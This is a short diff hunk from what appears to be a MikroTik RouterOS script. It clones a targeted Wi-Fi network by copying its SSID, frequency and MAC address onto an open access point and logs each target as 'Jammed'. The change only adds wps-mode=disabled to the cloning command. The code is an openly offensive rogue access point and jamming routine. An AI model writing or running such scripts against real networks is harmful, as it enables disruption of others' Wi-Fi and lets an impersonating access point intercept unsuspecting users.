@@ -30,7 +30,7 @@
   :if ($ssid="'" . $TARGETSSID . "'") do={
     /interface wireless reset-configuration $WLANIFACE
     /interface wireless security-profiles set 0 mode=none supplicant-identity=""
-    /interface wireless set $WLANIFACE mode=ap-bridge ssid=$TARGETSSID frequency=$freq mac-address=$mac radio-name=""
+    /interface wireless set $WLANIFACE mode=ap-bridge ssid=$TARGETSSID frequency=$freq mac-address=$mac radio-name="" wps-mode=disabled
     /interface wireless enable $WLANIFACE
     :log info "Jammed: $TARGETSSID $freq $mac"
   }
